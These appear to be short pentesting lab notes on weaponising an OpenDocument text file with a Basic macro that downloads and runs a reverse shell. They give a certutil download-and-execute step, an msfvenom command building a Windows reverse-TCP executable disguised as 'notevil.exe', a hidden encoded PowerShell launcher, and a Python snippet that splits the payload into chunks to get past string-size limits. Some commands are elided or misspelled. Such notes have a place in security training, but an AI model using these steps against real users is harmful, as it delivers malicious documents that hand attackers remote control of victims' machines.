
Method 1

Now create an odt file Then add the macro: Tools-> macros->Organise macros-->Basic

Create a macro
![[Pasted image 20251015125824.png]]

where the base64 is a certutil to the python server that downloads a revshell 
```
cert ..../revsehll.exe; ./revshell
```

encode:
```
	[convert]::Tobase64String([System.Text.Encoding]::Unicode.GetByte('certutil.exe.....))
```

Method 2

if we have resitrictions in String size so we divide the payload

Use msfvenom for payload:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.201 LPORT=4444 -f exe-o notevil.exe
```


```
s = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQB..."
n = 50
for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
```